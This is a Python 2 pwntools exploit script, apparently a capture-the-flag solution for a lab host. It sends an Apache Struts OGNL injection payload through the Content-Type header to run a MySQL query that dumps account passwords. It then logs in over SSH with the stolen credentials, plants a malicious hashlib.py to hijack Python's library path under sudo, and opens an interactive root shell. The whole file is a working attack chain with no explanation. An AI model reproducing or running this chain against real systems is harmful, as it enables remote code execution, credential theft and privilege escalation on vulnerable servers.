#!/usr/bin/python2
from pwn import *
import requests
import signal
import sys
import urllib2 
import httplib

py_root = 'import os; os.setresuid(os.geteuid(),os.geteuid(),os.geteuid());os.system("/bin/bash -ip")'
cmd = 'mysql -uadmin -padmin -e "use users;select username, password from accounts;"'
url = "http://10.10.10.64/Monitoring/example/Register.action"
expl = "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd= '"+str(cmd)+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" 

def main():
    try:
        log.info("Exploiting Apache Struts vulnarbilty")
        log.info("Dumping users from mysql")
        headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': expl}
        request = urllib2.Request(url, headers=headers)
        page = urllib2.urlopen(request).read()
        cred = "".join(page.split('\n')[1])
        cred = cred.replace('\t', ':')
        log.success("SSH creds are : " +str(cred))
        username = cred.split(":")[0]
        password = cred.split(":")[1]
    except httplib.IncompleteRead, e:
        page = e.partial
        cred = "".join(page.split('\n')[1])
        cred = cred.replace('\t', ':')
        log.info("SSH creds are : " +str(cred))
        username = cred.split(":")[0]
        password = cred.split(":")[1]
    log.success("Creating ssh session as "+username+" user with password :"+password)
    s = ssh(host='10.10.10.64', user=username, password=password)



    sh = s.process('/bin/bash', tty=True)
    log.info("Attempting to hijack python library path .....")
    sh.sendline("echo '"+py_root+"' > /home/richard/hashlib.py;chmod +x /home/richard/hashlib.py;sudo /usr/bin/python /home/richard/test.py")
    sh.recvlines(timeout=1)
    sh.sendline("whoami")
    root =  "".join(sh.recvlines(timeout=1))
    if "root" in root:
        log.success("Hijcaking successful!!! Spawning root shell")
        s.unlink("/home/richard/hashlib.py")
        sh.interactive(pwnlib.term.init())
    else:
        log.failure("Hijacking faild")
        s.close()
if __name__ == '__main__':
    main()
